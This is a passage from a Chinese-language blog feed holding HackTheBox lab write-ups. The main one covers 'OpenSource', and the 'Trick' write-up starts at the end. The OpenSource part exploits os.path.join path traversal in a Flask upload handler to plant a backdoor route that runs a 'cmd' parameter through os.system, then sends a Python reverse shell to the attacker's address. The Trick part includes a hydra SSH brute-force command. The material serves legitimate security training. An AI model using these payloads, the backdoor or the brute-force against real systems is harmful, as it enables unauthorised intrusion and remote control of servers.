SF:v<span class="token operator">=</span><span class="token punctuation">\</span>"Content-Type<span class="token punctuation">\</span>"<span class="token punctuation">\</span>x20content<span class="token operator">=</span><span class="token punctuation">\</span>"text/html<span class="token punctuation">;</span><span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token punctuation">\</span>"<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2
SF:0<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>title<span class="token operator">&gt;</span>Error<span class="token punctuation">\</span>x20response<span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20
SF:<span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>body<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Er
SF:ror<span class="token punctuation">\</span>x20response<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>p<span class="token operator">&gt;</span>Error<span class="token punctuation">\</span>x20code:
SF:<span class="token punctuation">\</span>x2040<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/p<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>p<span class="token operator">&gt;</span>Message:<span class="token punctuation">\</span>x20Bad<span class="token punctuation">\</span>x20requ
SF:est<span class="token punctuation">\</span>x20version<span class="token punctuation">\</span>x20<span class="token punctuation">\</span><span class="token punctuation">(</span><span class="token string">'RTSP/1\.0'</span><span class="token punctuation">\</span><span class="token punctuation">)</span><span class="token punctuation">\</span>.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x
SF:2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>p<span class="token operator">&gt;</span>Error<span class="token punctuation">\</span>x20code<span class="token punctuation">\</span>x20explanation:<span class="token punctuation">\</span>x20HTTPStatus<span class="token punctuation">\</span>.BAD_REQUEST<span class="token punctuation">\</span>x20-<span class="token punctuation">\</span>x20B
SF:ad<span class="token punctuation">\</span>x20request<span class="token punctuation">\</span>x20syntax<span class="token punctuation">\</span>x20or<span class="token punctuation">\</span>x20unsupported<span class="token punctuation">\</span>x20method<span class="token punctuation">\</span>.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>x20<span class="token punctuation">\</span>
SF:x20<span class="token punctuation">\</span>x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/body<span class="token operator">&gt;</span><span class="token punctuation">\</span>n<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span class="token punctuation">\</span>n"<span class="token punctuation">)</span><span class="token punctuation">;</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2585.43</span> seconds
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token number">93010</span> segmentation fault  nmap <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-oA</span> openssource <span class="token number">10.10</span>.11.164<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>22端口爆破失败，查看80端口，根据提示是一个上传文件漏洞</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.35.22.png" alt="截屏2022-09-03 18.35.22.png"></p>
<p>下载文件查看</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.41.07.png" alt="截屏2022-09-03 18.41.07.png"></p>
<p>扫一下目录看看</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 dirsearch.py <span class="token parameter variable">-u</span> http://10.10.11.164<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.45.16.png" alt="截屏2022-09-03 18.45.16.png"></p>
<p>访问/console目录，发现需要pin码，还是得从下载的文件中尝试获取</p>
<p><a href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass">https://github.com/wdahlenburg/werkzeug-debug-console-bypass</a></p>
<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">werkzeug</a></p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.43.40.png" alt="截屏2022-09-03 18.43.40.png"></p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_18.47.29.png" alt="截屏2022-09-03 18.47.29.png"></p>
<p>点击take me there，可以看到一个上传文件的页面</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_19.04.00.png" alt="截屏2022-09-03 19.04.00.png"></p>
<p>我们尝试上传一个正常文件并抓包</p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload">File Upload</a></p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_19.10.19.png" alt="截屏2022-09-03 19.10.19.png"></p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_19.10.30.png" alt="截屏2022-09-03 19.10.30.png"></p>
<p>看一下源代码：view.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upcloud'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        file_name <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
        file_path <span class="token operator">=</span> <span class="token operator">&lt;</span>strong<span class="token operator">&gt;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'success.html'</span><span class="token punctuation">,</span> file_url<span class="token operator">=</span>request<span class="token punctuation">.</span>host_url <span class="token operator">+</span> <span class="token string">"uploads/"</span> <span class="token operator">+</span> file_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;path:path&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">send_report</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token operator">&lt;</span>strong<span class="token operator">&gt;</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">&gt;</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这段代码有什么问题？问题在于“os.path.join”。阅读 os.path.join 的文档，我们可以看到，如果任何一个参数是绝对路径，则所有其他参数都被丢弃。如果我们能够将路径设置为绝对路径（例如：/app/app.py），我们应该能够获取文件。</p>
<p>If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.、</p>
<pre class="line-numbers language-none"><code class="language-none">os.path.join(path, *paths)
Join one or more path components intelligently. The return value is the concatenation of path and any members of *paths with exactly one directory separator following each non-empty part except the last, meaning that the result will only end in a separator if the last part is empty. If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

On Windows, the drive letter is not reset when an absolute path component (e.g., r'\foo') is encountered. If a component contains a drive letter, all previous components are thrown away and the drive letter is reset. Note that since there is a current directory for each drive, os.path.join("c:", "foo") represents a path relative to the current directory on drive C: (c:foo), not c:\foo.

Changed in version 3.6: Accepts a path-like object for path and paths.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当尝试在 /uploads/上使用绝对路径时，Werkzueg 应用程序会规范化路径，因此 /uploads//etc/passwd 只会被规范化为 /uploads/etc/passwd。另一种途径是我们可以上传一个具有绝对路径文件名的文件。</p>
<p><a href="https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/">https://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/</a></p>
<p>检查Dockerfile，我们可以看到应用程序将运行的位置，然后使用upload.py 将上传views.py文件，文件名为“/app/app.py”。</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.49.49.png" alt="截屏2022-09-03 20.49.49.png"></p>
<p>我们可以通过覆盖views.py，通过rce()来获取一个shel</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.48.58.png" alt="截屏2022-09-03 20.48.58.png"></p>
<p>views.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> asyncio <span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess

<span class="token keyword">from</span> app<span class="token punctuation">.</span>utils <span class="token keyword">import</span> get_file_name
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file

<span class="token keyword">from</span> app <span class="token keyword">import</span> app

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        file_name <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'success.html'</span><span class="token punctuation">,</span> file_url<span class="token operator">=</span>request<span class="token punctuation">.</span>host_url <span class="token operator">+</span> <span class="token string">"uploads/"</span> <span class="token operator">+</span> file_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;path:path&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">send_report</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/l1b3r'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.51.34.png" alt="截屏2022-09-03 20.51.34.png"></p>
<p>修改数据包</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">POST <span class="token operator">/</span>upcloud HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> <span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.164</span>
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv<span class="token punctuation">:</span><span class="token number">102.0</span><span class="token punctuation">)</span> Gecko<span class="token operator">/</span><span class="token number">20100101</span> Firefox<span class="token operator">/</span><span class="token number">102.0</span>
Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span>
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> en<span class="token operator">-</span>US<span class="token punctuation">,</span>en<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.5</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> multipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">;</span> boundary<span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">311700995310061811532835263190</span>
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">226</span>
Origin<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.164</span>
Connection<span class="token punctuation">:</span> close
Referer<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.164</span><span class="token operator">/</span>upcloud
Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>

<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">311700995310061811532835263190</span>
Content<span class="token operator">-</span>Disposition<span class="token punctuation">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"..//app/app/views.py"</span>
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>x<span class="token operator">-</span>python

<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess

<span class="token keyword">from</span> app<span class="token punctuation">.</span>utils <span class="token keyword">import</span> get_file_name
<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file

<span class="token keyword">from</span> app <span class="token keyword">import</span> app

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
        file_name <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
        file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">)</span>
        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'success.html'</span><span class="token punctuation">,</span> file_url<span class="token operator">=</span>request<span class="token punctuation">.</span>host_url <span class="token operator">+</span> <span class="token string">"uploads/"</span> <span class="token operator">+</span> file_name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;path:path&gt;'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">send_report</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> get_file_name<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/l1b3r'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">311700995310061811532835263190</span><span class="token operator">-</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>放数据包</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.54.22.png" alt="截屏2022-09-03 20.54.22.png"></p>
<p>我们去访问l1b3r,得到</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.55.03.png" alt="截屏2022-09-03 20.55.03.png"></p>
<p><a href="https://www.notion.so/">https://www.notion.so</a></p>
<p>接下来我们生成一段python的反向shell</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_20.57.32.png" alt="截屏2022-09-03 20.57.32.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>启一个监听</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.164</span><span class="token operator">/</span>l1b3r?cmd<span class="token operator">=</span><span class="token punctuation">]</span><span class="token punctuation">(</span>http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.164</span><span class="token operator">/</span>l1b3r?cmd<span class="token operator">=</span>ls<span class="token punctuation">)</span>python3 <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功收到shell</p>
<p><img src="/2022/10/07/htb-opensource/%25E6%2588%25AA%25E5%25B1%258F2022-09-03_21.00.39.png" alt="截屏2022-09-03 21.00.39.png"></p>
]]></content>
      <categories>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Trick</title>
    <url>/2022/10/08/htb-trick/</url>
    <content><![CDATA[<h1 id="HTB-Trick"><a href="#HTB-Trick" class="headerlink" title="HTB-Trick"></a>HTB-Trick</h1><p>ip:10.10.11.166</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span><span class="token class-name">Pn</span> <span class="token operator">-</span>sS <span class="token operator">-</span>v <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.166</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/10/08/htb-trick/%25E6%2588%25AA%25E5%25B1%258F2022-08-29_20.44.20.png" alt="截屏2022-08-29 20.44.20.png"></p>
<p>爆破22端口失败</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">hydra <span class="token number">10.10</span><span class="token number">.11</span><span class="token number">.166</span> ssh <span class="token operator">-</span>l root <span class="token operator">-</span><span class="token class-name">P</span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz <span class="token operator">-</span>t <span class="token number">6</span> <span class="token operator">-</span>v <span class="token operator">-</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看80端口，抓包看一下请求，没什么用</p>
